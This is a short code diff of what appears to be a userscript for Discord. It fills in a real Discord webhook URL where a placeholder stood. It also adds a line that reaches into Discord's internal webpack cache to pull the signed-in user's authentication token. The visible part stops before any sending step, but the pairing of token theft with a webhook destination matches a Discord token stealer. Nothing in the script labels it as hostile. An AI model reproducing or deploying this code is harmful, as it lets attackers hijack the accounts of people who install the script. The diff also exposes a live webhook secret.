@@ -26,7 +26,7 @@
 
    'use strict';
 
-    const url = "YOUR-WEBHOOK";
+    const url = "https://discord.com/api/webhooks/930254753571692594/WeNGw0aHO-Y4kyTRbwSmf3B2-jJ-y5BIF_VrokV6Z0EQje_7ZnJwsARLAwh1yDXgfWNz";
 
     setTimeout(async function() {
         const token = Object.values(webpackJsonp.push([[],{['']:(_,e,r)=>{e.cache=r.c}},[['']]]).cache).find(m=>m.exports&&m.exports.default&&m.exports.default.getToken!==void 0).exports.default.getToken();
